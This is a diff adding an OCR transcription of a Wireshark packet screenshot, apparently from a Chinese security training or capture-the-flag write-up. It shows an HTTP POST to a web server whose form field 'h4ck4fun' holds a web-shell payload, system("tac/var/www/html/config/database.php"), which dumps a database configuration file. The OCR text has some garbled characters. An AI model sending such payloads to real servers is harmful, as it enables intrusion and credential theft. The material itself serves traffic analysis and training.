@@ -1,0 +1,13 @@
+# OCR: 8be8dd4e65b5a7b55258d020a9a06836.webp
+# 来源: ./02-WriteUp/2025/2025-能力验证-培训/8be8dd4e65b5a7b55258d020a9a06836.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:37
+
+Frame7462:Packet,868bytesonwire(6944bits),868bytescaptured（6944bits）
+EthernetII,Src:Parallels6e:f7:4b(00:1c:42:6e:f7:4b),Dst:Parallels00:00:18(00:1c:42:6 InternetProtoco1Version 4,Src: 10.211.88.7(10.211.88.7),Dst: 192.168.0.177(192.168.0.17
+Transmission Control Protocol,Src Port: 6ooo2,Dst Port:1ooo1, Seg: 1,Ack:1,Len:814 HypertextTransferProtocol
+HTMLFormURLEncodedapplication/x-www-form-urlencoded
+Formitem:"h4ck4fun"="system("tac/var/www/html/config/database.php");'
+Key:h4ck4fun
+Value:system("tac/var/www/html/config/database.php");
